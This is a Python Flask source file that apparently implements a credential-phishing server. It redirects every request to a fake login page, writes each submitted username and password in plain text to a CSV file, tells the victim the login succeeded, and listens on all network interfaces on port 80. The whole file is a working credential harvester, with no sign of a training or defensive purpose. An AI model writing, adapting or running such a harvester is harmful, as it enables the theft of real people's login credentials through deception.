
from flask import Flask, request, render_template, redirect, url_for
import csv
import os

app = Flask(__name__)

# The name of the file to save credentials to
LOG_FILE = os.path.join(os.path.dirname(__file__), '..', 'data', 'logins.csv')

@app.before_request
def before_request():
    """Redirect all requests to the login page, except for the login page itself and the login submission."""
    if request.path not in ['/', '/login']:
        return redirect(url_for('home'))

@app.route('/')
def home():
    """Serves the login page."""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Handles the login form submission."""
    username = request.form.get('username')
    password = request.form.get('password')

    # Save the credentials to the CSV file
    with open(LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([username, password])

    return "Login successful. Thank you."

if __name__ == '__main__':
    # Ensure the log file exists
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Username', 'Password'])

    # Run the app on all available network interfaces
    app.run(host='0.0.0.0', port=80, debug=False)
